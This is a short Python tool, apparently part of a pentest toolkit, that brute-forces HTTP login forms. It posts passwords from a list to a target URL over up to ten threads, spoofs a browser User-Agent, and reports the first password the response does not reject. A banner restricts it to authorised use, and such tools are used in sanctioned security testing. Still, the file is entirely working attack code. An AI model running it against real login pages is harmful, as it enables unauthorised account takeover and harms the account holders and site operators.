#!/usr/bin/env python3
"""
HTTP Brute Force - Test de mots de passe HTTP
⚠️ USAGE ÉTHIQUE UNIQUEMENT - Avec autorisation explicite
Author: Ludovic Mouly
"""
import requests
from concurrent.futures import ThreadPoolExecutor


def try_login(url: str, user: str, pwd: str, session: requests.Session) -> dict:
    """Teste une combinaison username/password"""
    try:
        data = {"username": user, "password": pwd}
        resp = session.post(url, data=data, timeout=5)
        
        success = (
            "Login failed" not in resp.text and 
            "Invalid" not in resp.text and
            resp.status_code == 200
        )
        
        return {
            'password': pwd,
            'success': success,
            'status_code': resp.status_code
        }
    
    except Exception as e:
        return {
            'password': pwd,
            'success': False,
            'error': str(e)
        }


def brute_force_func(data):
    """Brute force HTTP multi-thread"""
    try:
        url = data.get('url', '').strip()
        username = data.get('username', '').strip()
        passwords = data.get('passwords', [])
        threads = data.get('threads', 5)
        
        if not all([url, username, passwords]):
            return {'error': 'URL, username et liste de passwords requis'}
        
        if threads > 10:
            threads = 10
        
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        
        results = []
        found_password = None
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(try_login, url, username, pwd, session) 
                for pwd in passwords
            ]
            
            for future in futures:
                result = future.result()
                results.append(result)
                
                if result['success']:
                    found_password = result['password']
                    break
        
        return {
            'tested': len(results),
            'found': found_password is not None,
            'password': found_password,
            'results': results[:10]
        }
    
    except Exception as e:
        return {'error': f'Erreur brute force: {str(e)}'}
